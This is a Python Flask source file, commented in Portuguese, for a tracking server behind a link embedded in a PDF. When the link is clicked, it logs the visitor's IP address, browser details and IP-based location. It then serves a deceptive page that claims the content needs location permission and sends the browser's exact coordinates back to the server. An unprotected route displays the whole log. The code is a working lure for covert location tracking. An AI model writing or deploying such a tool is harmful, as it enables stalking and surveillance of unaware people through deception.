"""Coletor de acesso — Flask, recebe clique do link do PDF."""
from flask import Flask, request, jsonify
from datetime import datetime
import json, os

app = Flask(__name__)
LOG = os.path.join(os.path.dirname(__file__), "logacoes.jsonl")

def geo_ip(ip):
    """GeoIP via ipinfo.io (sem token = limite baixo)."""
    import urllib.request
    try:
        token = os.environ.get("IPINFO_TOKEN", "")
        url = f"https://ipinfo.io/{ip}/json"
        if token: url += f"?token={token}"
        req = urllib.request.Request(url, headers={"User-Agent": "coletor-fly/1.0"})
        with urllib.request.urlopen(req, timeout=3) as r:
            return json.loads(r.read())
    except Exception as e:
        return {"err": str(e)}

def log(rec):
    with open(LOG, "a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")

@app.route("/")
def home():
    return "ok", 200

@app.route("/track")
def track():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
    rec = {
        "ts": datetime.utcnow().isoformat() + "Z",
        "id": request.args.get("id", "?"),
        "ip": ip,
        "ua": request.headers.get("User-Agent", ""),
        "lang": request.headers.get("Accept-Language", ""),
        "referer": request.headers.get("Referer", ""),
        "geo": geo_ip(ip),
    }
    log(rec)
    # Página que PEDE geolocalização ao navegador
    return f"""<!doctype html><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Conteúdo</title>
<style>body{{font-family:system-ui;max-width:480px;margin:40px auto;padding:0 16px;color:#222}}</style>
<h2>Conteúdo online</h2>
<p>Para visualizar, permita o acesso à localização quando o navegador pedir.</p>
<p><small>Acesso registrado: IP {rec['ip']} · {rec['geo'].get('city','?')}/{rec['geo'].get('region','?')}/{rec['geo'].get('country','?')}</small></p>
<script>
const id = {json.dumps(rec["id"])};
navigator.geolocation.getCurrentPosition(
  p => fetch("/geo", {{method:"POST", headers:{{"Content-Type":"application/json"}},
    body: JSON.stringify({{id, lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy, src:"browser"}})}}),
  e => fetch("/geo", {{method:"POST", headers:{{"Content-Type":"application/json"}},
    body: JSON.stringify({{id, err:e.message, src:"browser"}})}})
);
</script>"""

@app.route("/geo", methods=["POST"])
def geo():
    log(json.loads(request.get_data() or b"{}"))
    return "", 204

@app.route("/log")
def ver_log():
    if not os.path.exists(LOG): return "vazio"
    with open(LOG, encoding="utf-8") as f: return "<pre>" + f.read() + "</pre>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)